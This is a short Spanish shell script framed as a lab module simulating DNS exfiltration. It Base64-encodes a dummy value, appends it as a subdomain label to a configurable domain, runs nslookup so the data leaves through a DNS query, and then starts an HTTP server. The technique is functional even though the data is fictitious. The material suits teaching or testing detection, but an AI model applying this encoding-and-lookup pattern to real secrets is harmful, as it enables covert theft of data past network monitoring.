
#!/bin/sh

set -eu

echo "========================================"
echo " MODULO 04 - SIMULACION EXFILTRACION DNS"
echo "========================================"

# Dato completamente ficticio para el laboratorio
DATOS_SENSIBLES="dato_ficticio_laboratorio_2026"

echo "[INFO] Dato ficticio: $DATOS_SENSIBLES"

# Codificacion Base64
DATOS_CODIFICADOS=$(printf '%s' "$DATOS_SENSIBLES" | base64 | tr -d '\n')

echo "[INFO] Dato codificado en Base64:"
echo "$DATOS_CODIFICADOS"

echo ""
echo "[INFO] Consultando el dominio de nuestra DMZ..."

DOMINIO="${TARGET_HOST:-servidor-web-dmz-smesa.onrender.com}"

# La etiqueta DNS se mantiene dentro del limite permitido
ETIQUETA=$(printf '%s' "$DATOS_CODIFICADOS" | cut -c1-50)

echo "[DNS] Consulta de demostracion:"
echo "${ETIQUETA}.${DOMINIO}"

if nslookup "${ETIQUETA}.${DOMINIO}" 2>&1; then
    echo "[DNS] Consulta completada."
else
    echo "[DNS] No fue posible resolver la consulta."
fi

echo ""
echo "[INFO] Simulacion DNS finalizada."
echo "[INFO] Iniciando servicio de estado..."

mkdir -p /tmp/empty

python3 -m http.server "${PORT:-10000}" --bind 0.0.0.0 --directory /tmp/empty
